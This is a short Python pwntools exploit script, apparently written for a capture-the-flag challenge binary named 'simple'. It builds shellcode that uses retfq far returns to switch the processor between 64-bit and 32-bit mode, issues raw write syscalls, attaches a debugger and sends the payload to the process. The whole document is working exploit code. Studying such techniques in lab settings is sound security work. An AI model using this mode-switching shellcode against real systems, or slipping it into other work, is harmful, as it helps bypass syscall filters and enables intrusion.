#encoding: utf-8

from pwn import *

#context.arch = 'amd64'

r = process('./simple')

code = 0x601060
bss = 0x602000

sh1 = asm('''
		mov qword ptr [rsp+0x8], 0x23
	''', arch='amd64')

sh2 = asm('''
		pop rax
		push {ra}
		retfq
		mov esp, {bss}
	'''.format(ra=code+len(sh1)+8, bss=bss+0x800), arch='amd64')

sh3 = asm('''
		pusha
		popa
		/* write(1, code, 8) */
		mov eax, 4
		mov ebx, 1
		mov ecx, 0x601060
		mov edx, 8
		int 0x80
		mov eax, 0
		int 0x80
		''',arch='i386')

sh4 = asm('''
		push 0x33
		push {ra}
		retfq
		/* write(1, code, 8) */
		mov rax, 1
		mov rdi, 1
		mov rsi, 0x601060
		mov rdx, 8
		syscall
	'''.format(ra=code+len(sh1+sh2+sh3)+9),arch='amd64')



sh = sh1+sh2+sh3+sh4
#print(sh)

gdb.attach(r, 'b *0x40050d\nc')
r.sendline(sh)

r.interactive()